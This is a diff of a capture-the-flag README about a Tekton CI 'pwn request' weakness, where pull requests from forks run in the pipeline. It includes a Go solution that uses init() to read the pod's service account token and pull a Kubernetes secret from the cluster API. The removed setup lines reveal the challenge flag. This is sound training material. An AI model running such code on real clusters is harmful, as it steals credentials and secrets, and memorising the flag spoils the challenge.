@@ -34,49 +34,28 @@ This is similar to the GitHub Actions `pull_request_target` vulnerability, but p
 - The blast radius includes the entire cluster
 - Lateral movement to other namespaces may be possible
 
-## Setup (For CTF Organizers)
+## Setup 
 
 ### Prerequisites
 - Kubernetes cluster (or kind cluster)
 - Tekton Pipelines installed
 - Tekton Triggers installed
+- ctf-challenge namespace created, with tekton pipeline, event-listener, tasks, etc created
 
-### Install the Vulnerable Environment
-
-```bash
-# 1. Apply Tekton resources
-kubectl apply -f challenges/challenge1/tekton/triggers/vulnerable-eventlistener.yaml
-kubectl apply -f challenges/challenge1/tekton/tasks/supporting-tasks.yaml
-kubectl apply -f challenges/challenge1/tekton/tasks/vulnerable-quality-check-task.yaml
-kubectl apply -f challenges/challenge1/tekton/pipelines/vulnerable-pr-quality-pipeline.yaml
-
-# 2. Create the flag secret
-kubectl create secret generic ctf-flag \
-  --from-literal=flag='FLAG{t3kt0n_pwn_r3qu3st_1s_d4ng3r0us}' \
-  -n default
-
-# 3. Expose the EventListener (for webhook simulation)
-kubectl port-forward svc/el-pr-quality-check-listener 8080:8080 -n default
+You can usually setup everything by running
+```
+make setup
+make setup-ctf-challenge
 ```
 
-### Victim Repository Setup
+See README.md (at root of repository) for more instructions
 
-Create a sample repository with this structure:
-```
-victim-repo/
-├── README.md
-├── scripts/
-│   └── quality-check/
-│       └── main.go  (benign version)
-└── .tekton/
-    └── README.md  (explains the CI/CD setup)
-```
 
-## Challenge Instructions (For Participants)
+## Challenge Instructions 
 
 ### Scenario
 
-You have discovered that the repository `awesome-project` uses Tekton Pipelines for PR quality checks. The pipeline is configured to run automatically when PRs are opened.
+You have discovered that the repository `victim-repo` uses Tekton Pipelines for PR quality checks. The pipeline is configured to run automatically when PRs are opened.
 
 Your investigation reveals:
 1. The pipeline runs on all PRs (including from forks)
@@ -136,60 +115,61 @@ Create `scripts/quality-check/main.go` with this content:
 
 ```go
 package main
-
 import (
-    "crypto/tls"
-    "fmt"
-    "io/ioutil"
-    "net/http"
-    "os"
-    "time"
+	"crypto/tls"
+	"fmt"
+	"io"
+	"net/http"
+	"os"
+	"path/filepath"
+	"strings"
+	"time"
 )
 
 func init() {
-    // This runs automatically before main()
-    if os.Getenv("PR_TASK_RUN") == "true" {
-        go stealFlag()
-        time.Sleep(2 * time.Second)
-    }
+	// This runs automatically before main()
+	if os.Getenv("PR_TASK_RUN") == "true" {
+		go stealFlag()
+		time.Sleep(2 * time.Second)
+	}
 }
 
 func stealFlag() {
-    // Read ServiceAccount token
-    token, _ := ioutil.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/token")
-    namespace, _ := ioutil.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace")
+	// Read ServiceAccount token
+	token, _ := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/token")
+	namespace, _ := os.ReadFile("/var/run/secrets/kubernetes.io/serviceaccount/namespace")
 
-    // Kubernetes API endpoint
-    apiServer := "https://kubernetes.default.svc"
-    secretURL := fmt.Sprintf("%s/api/v1/namespaces/%s/secrets/ctf-flag",
-                             apiServer, string(namespace))
+	// Kubernetes API endpoint
+	apiServer := "https://kubernetes.default.svc"
+	secretURL := fmt.Sprintf("%s/api/v1/namespaces/%s/secrets/ctf-flag",
+		apiServer, string(namespace))
 
-    // Create HTTP client
-    client := &http.Client{
-        Timeout: 5 * time.Second,
-        Transport: &http.Transport{
-            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
-        },
-    }
+	// Create HTTP client
+	client := &http.Client{
+		Timeout: 5 * time.Second,
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	}
 
-    // Make API request
-    req, _ := http.NewRequest("GET", secretURL, nil)
-    req.Header.Set("Authorization", "Bearer "+string(token))
+	// Make API request
+	req, _ := http.NewRequest("GET", secretURL, nil)
+	req.Header.Set("Authorization", "Bearer "+string(token))
 
-    resp, err := client.Do(req)
-    if err != nil {
-        fmt.Fprintf(os.Stderr, "API Error: %v\n", err)
-        return
-    }
-    defer resp.Body.Close()
+	resp, err := client.Do(req)
+	if err != nil {
+		fmt.Fprintf(os.Stderr, "API Error: %v\n", err)
+		return
+	}
+	defer resp.Body.Close()
 
-    // Read response
-    body, _ := ioutil.ReadAll(resp.Body)
+	// Read response
+	body, _ := io.ReadAll(resp.Body)
 
-    // Write flag to /tmp so we can see it in logs
-    ioutil.WriteFile("/tmp/FLAG.txt", body, 0644)
+	// Write flag to /tmp so we can see it in logs
+	os.WriteFile("/tmp/FLAG.txt", body, 0644)
 
-    fmt.Printf("Secret retrieved : %s - check /tmp/FLAG.txt", body)
+	fmt.Printf("Secret retrieved : %s - check /tmp/FLAG.txt", body)
 }
 
 func main() {
